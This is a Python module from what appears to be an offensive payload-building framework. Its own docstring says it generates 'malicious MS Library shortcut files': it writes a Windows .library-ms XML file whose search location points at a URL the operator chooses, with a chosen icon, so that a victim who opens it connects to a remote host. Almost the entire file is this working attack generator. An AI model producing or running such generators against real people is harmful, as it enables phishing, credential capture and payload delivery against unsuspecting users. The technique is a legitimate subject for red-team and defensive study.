#!/usr/bin/env python
# encoding: utf-8

import logging

from common.utils import getParamValue, MPParam
from modules.payload_builder import PayloadBuilder


LIBRARY_MS_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@shell32.dll,-34575</name>
  <version>20</version>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference><<<ICON>>></iconReference>
  <templateInfo>
    <folderType>{5C4F28B5-F869-4E84-8E60-F11DB97C5CC7}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription publisher="Microsoft" product="Windows">
      <description>test1</description>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url><<<TARGET>>></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

"""

class LibraryShortcutGenerator(PayloadBuilder):
    """ Module used to generate malicious MS Library shortcut files"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")
        paramArray = [MPParam("targetUrl")]
        self.fillInputParams(paramArray)
        targetUrl = getParamValue(paramArray, "targetUrl")

        # Fill template
        content = LIBRARY_MS_TEMPLATE
        content = content.replace("<<<TARGET>>>", targetUrl)
        content = content.replace("<<<ICON>>>", self.mpSession.icon)

        with open(self.outputFilePath, 'w') as f:
            f.writelines(content)
        logging.info(
            f"   [-] Generated MS Library Shortcut file: {self.outputFilePath}"
        )

        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)


        